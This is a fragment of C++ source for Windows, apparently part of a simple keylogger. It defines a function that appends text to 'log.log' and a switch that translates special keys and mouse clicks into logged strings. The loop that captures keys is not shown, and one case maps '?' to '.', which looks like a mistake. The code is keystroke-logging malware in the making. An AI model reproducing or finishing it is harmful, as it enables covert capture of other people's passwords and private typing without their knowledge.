#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
using namespace std;

void LOG(string input) {
    fstream LogFile;
    LogFile.open("log.log", fstream::app);
    if (LogFile.is_open()) {
        LogFile << input;
        LogFile.close();
    }
}

bool SpecialKeys(int S_Key) {
	//LOG(S_Key);
	
    switch (S_Key) {
        case VK_SPACE:
            cout << " ";
            LOG(" ");
            return true;
        case VK_RETURN:
            cout << "\n";
            LOG("\n");
            return true;
        case '?':
            cout << ".";
            LOG(".");
            return true;
        case VK_SHIFT:
            cout << "#SHIFT#";
            LOG("#SHIFT#");
            return true;
        case VK_BACK:
            cout << "\b";
            LOG("\b");
            return true;
        case VK_LBUTTON:
            cout << "#L_CLICK#";
            LOG("#L_CLICK#");
            return true;
        case VK_RBUTTON:
            cout << "#R_CLICK#";
            LOG("#R_CLICK#");
            return true;
        default:
            return false;
    }
    
}
